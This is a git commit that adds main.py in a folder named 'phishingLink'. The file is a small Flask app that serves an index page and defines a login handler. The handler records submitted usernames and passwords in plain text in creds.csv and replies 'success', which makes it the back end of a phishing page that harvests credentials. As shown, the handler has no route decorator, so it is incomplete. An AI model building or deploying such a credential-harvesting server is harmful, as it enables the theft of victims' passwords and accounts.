8c8fdf3cfa2393d3bbc64d261372a57abc986fb2
sriyabetageri <75461862+sriyabetageri@users.noreply.github.com>
2023-05-01 18:40:04 -0700

    Add files via upload

---
+++ phishingLink/main.py
@@ -0,0 +1,21 @@
+from flask import Flask, redirect, url_for, request, render_template,jsonify
+import csv
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    return render_template("/index.html")
+
+def login():
+    username = request.json.get("username")
+    password = request.json.get("password")
+    with open("creds.csv","a+") as f : 
+        csv_writer = csv.writer(f)
+        csv_writer.writerow([username, password])
+    return jsonify({
+        "status": "success" 
+    }), 201
+
+if __name__ =="__main__":
+    app.run(debug = True)
